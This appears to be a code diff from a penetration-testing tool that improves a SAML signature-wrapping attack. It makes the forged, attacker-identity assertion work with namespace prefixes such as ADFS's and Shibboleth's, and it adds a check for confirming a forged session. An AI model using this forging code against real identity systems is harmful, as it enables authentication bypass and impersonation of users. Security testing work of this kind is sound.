@@ -175,9 +175,19 @@ def _build_aliased_forged_xml(original_assertion, alias_prefix: str) -> bytes:
     _set_nameid(forged, _ATTACKER_NAMEID)
     raw = etree.tostring(forged)
     alias = alias_prefix.encode()
-    raw = raw.replace(b"xmlns:saml=", b"xmlns:" + alias + b"=")
-    raw = raw.replace(b"<saml:", b"<" + alias + b":")
-    raw = raw.replace(b"</saml:", b"</" + alias + b":")
+    # Rewrite the assertion's ACTUAL serialized prefix, not a hardcoded `saml`.
+    # A real captured assertion may bind the SAML assertion namespace to any
+    # prefix (ADFS/Shibboleth commonly use `saml2:`); hardcoding `<saml:` made
+    # the replaces silently no-op on those, leaving the forged assertion with
+    # the SAME prefix as the original — i.e. no wrapping at all. The prefix is
+    # the same one `_xsw_namespace_alias_splice` uses for its splice-boundary
+    # tags (original_assertion.prefix), so alias and boundary stay consistent.
+    src_prefix = original_assertion.prefix
+    if src_prefix:
+        src = src_prefix.encode()
+        raw = raw.replace(b"xmlns:" + src + b"=", b"xmlns:" + alias + b"=")
+        raw = raw.replace(b"<" + src + b":", b"<" + alias + b":")
+        raw = raw.replace(b"</" + src + b":", b"</" + alias + b":")
     return raw
 
 
@@ -281,6 +291,19 @@ def confirm_new_session(client, acs_url: str, forged_response_b64: str,
     set_cookie = dict(acs_response.headers).get("Set-Cookie")
     if not set_cookie:
         return XswResult(confirmed=False, detail="no session cookie issued", response=acs_response)
+
+    if not protected_resource_url:
+        # The ACS issued a session cookie, but without a protected-resource URL
+        # there is nothing to replay it against — and calling client.get("")
+        # would raise in the real HTTP client. A bare Set-Cookie is never proof
+        # on its own (that is the whole point of this function), so report it as
+        # unconfirmed with an actionable detail rather than crashing.
+        return XswResult(
+            confirmed=False,
+            detail="ACS issued a session cookie but no protected-resource URL "
+                   "(VAPT_SAML_PROTECTED_RESOURCE) was supplied to confirm the forged session against",
+            response=acs_response,
+        )
 
     session_cookie = set_cookie.split(";")[0]
     # cookies={} is keyed by cookie NAME -> value; passing the whole
